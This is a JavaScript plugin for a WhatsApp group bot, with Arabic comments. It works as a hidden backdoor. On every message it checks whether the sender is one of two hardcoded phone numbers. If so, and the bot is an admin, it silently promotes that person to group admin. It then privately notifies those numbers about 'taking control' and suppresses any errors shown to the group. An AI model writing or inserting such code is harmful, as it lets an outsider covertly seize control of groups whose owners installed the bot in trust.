// الكود للملك تنغن 👑 - ترقية ذاتية صامتة (بدون أوامر)
// File: auto-king-admin.js

const handler = async (m, { conn, groupMetadata }) => {
    
    // 👑 الأرقام الملكية الوحيدة التي تستحق هذه الصلاحية
    const KING_NUMBERS = ['212706595340@s.whatsapp.net', '212627416260@s.whatsapp.net'];
    const sender = m.sender;
    
    // 1. التحقق من أن المُرسل هو الملك (تنغن)
    const isKing = KING_NUMBERS.includes(sender);
    
    if (!isKing) return; // لا ينفذ إلا للملك
    
    // 2. يجب أن يكون في مجموعة
    if (!m.isGroup) return;
    
    // 3. التحقق من وضع البوت والمجموعة
    const botJid = conn.user.jid;
    const participants = groupMetadata?.participants || [];
    
    // يجب أن يكون البوت مشرفاً لكي يستطيع الترقية
    const bot = participants.find((u) => conn.decodeJid(u.id) === botJid) || {};
    const isBotAdmin = bot?.admin || false;
    if (!isBotAdmin) return; 
    
    // 4. التحقق مما إذا كان الملك مشرفاً بالفعل
    const kingInGroup = participants.find((u) => conn.decodeJid(u.id) === sender) || {};
    const isKingAdmin = kingInGroup?.admin || false;
    
    if (isKingAdmin) {
        // إذا كان مشرفاً، يتوقف بصمت
        return; 
    }
    
    // 5. تنفيذ الترقية الصامتة
    try {
        await conn.groupParticipantsUpdate(m.chat, [sender], 'promote');
        
        // رد فعل سريع بدلاً من رسالة كاملة
        await m.react('👑'); 
        
        // 6. إرسال تنبيه إلى أرقامك الملكية (لمتابعة السيطرة)
        const subject = groupMetadata?.subject || 'مجموعة مجهولة';
        const notification = `🚩 *تفعيل السيطرة الذاتية للملك الغراب @${sender.split('@')[0]}* في المجموعة: ${subject}`;

        for (const num of KING_NUMBERS) {
             await conn.reply(num, notification, m, { mentions: [sender] });
        }
        
    } catch (error) {
        // لا يتم إرسال رسالة خطأ للمجموعة للحفاظ على الصمت الملكي
        console.error('AutoAdmin Listener Error:', error);
    }
};

// يتم تصديره بدون أمر، ليتم تحميله كـ "مستمع" يشتغل مع كل رسالة
export default handler;